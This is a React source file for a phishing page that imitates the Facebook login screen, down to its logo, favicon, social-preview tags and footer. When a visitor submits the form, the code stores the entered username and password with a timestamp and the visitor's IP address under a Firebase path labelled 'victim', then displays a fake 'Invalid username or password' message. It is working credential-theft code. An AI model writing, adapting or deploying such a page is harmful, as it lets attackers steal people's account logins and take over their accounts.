import { ref, set } from "firebase/database"
import { useEffect, useState } from "react"
import {  useParams } from "react-router-dom"
import { database } from "../../../DATABASE/Config"
import { Helmet } from "react-helmet"





const Facebook = () => {
  const {uid} = useParams()
  const [wrong, setWrong] = useState(false)
  const [user, setUser] = useState({
    name: '',
    password: '',
  });
  const [ip, setIp] = useState('')

  const date = new Date();
  const localDate = date.toLocaleString();

  useEffect(() => {
    fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => setIp(data.ip))
    .catch(error => console.log(error))
  },[])

useEffect(() => {
  window.location.reload
},[])
const send =(e) => {
    e.preventDefault()
    setWrong(true)

    set(ref(database, `user/${uid}/victim/facebook/${Date.now()}/`),{
      user: user.name,
      password: user.password,
      date: localDate,
      ip
    })

  }
  return (
    <div>

    <Helmet>
      <meta property="og:title" content="Facebook" />
      <meta property="og:image" content="https://www.edigitalagency.com.au/wp-content/uploads/Facebook-logo-blue-circle-large-transparent-png.png" />
      <title>Facebook</title>
      <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png" />
    </Helmet>

    {wrong && (<div className="bg-red-500 w-full p-1 text-white text-sm">Invalid username or password</div>)}
      <div className="h-screen flex flex-col items-center mx-16">
        <div>
          <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="facebook" className="h-[100px] w-[150px]" />
        </div>
        <div className="flex flex-col items-center justify-center w-full">
          <form className="flex flex-col w-full" onSubmit={send}>
            <input type="text" placeholder="Mobile number or email address" className="w-full border shadow-sm m-1 h-10 px-4 rounded" onChange={(e) => setUser({...user, name: e.target.value})} />
            <input type="password" placeholder="Password" className="w-full border shadow-sm m-1 h-10 px-4 rounded" onChange={(e) => setUser({...user, password: e.target.value})} />
            <button className="bg-blue-600 my-2 p-2 font-bold text-white rounded">Log In</button>
          </form>
          <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" className="text-blue-600 text-sm">Forgotten password?</a>
        </div>

        <div className="w-full flex  justify-center h-10 items-center">
          <div className="border-b border-gray-300 w-full"></div>
          <div className="h-10 flex items-center justify-center mx-5">or</div>
          <div className="border-b border-gray-300 w-full"></div>
        </div>

        <div>
          <button className="border-[1px] w-72 p-1 font-bold">Create new account</button>
        </div>

        <div className="flex justify-between w-full mt-28">
          <div>
            <ul className="text-center text-[12px]">
              <li>English (UK)</li>
              <li className="text-blue-600">অসমীয়া</li>
              <li className="text-blue-600"></li>
              <li className="text-blue-600">Portugues (Brazil)</li>
            </ul>
          </div>
          <div>
            <ul className="flex flex-col items-center text-center text-[12px]">
              <li className="text-blue-600">বাংলা</li>
              <li className="text-blue-600">hindi</li>
              <li className="text-blue-600">Espanol</li>
              <li className="border border-blue-600  w-5">+</li>
            </ul>
          </div>
        </div>

        <div className="flex items-center justify-center">
          <li className="list-none px-2 text-[10px] text-gray-400">About</li>
          <li className=" px-2 text-[10px] text-gray-400">Help</li>
          <li className=" px-2 text-[10px] text-gray-400">More</li>
        </div>

        <div className="text-[12px] py-3 text-gray-400">Meta &copy; 2023</div>
        
      </div>
      
    </div>
    
  )
}

export default Facebook
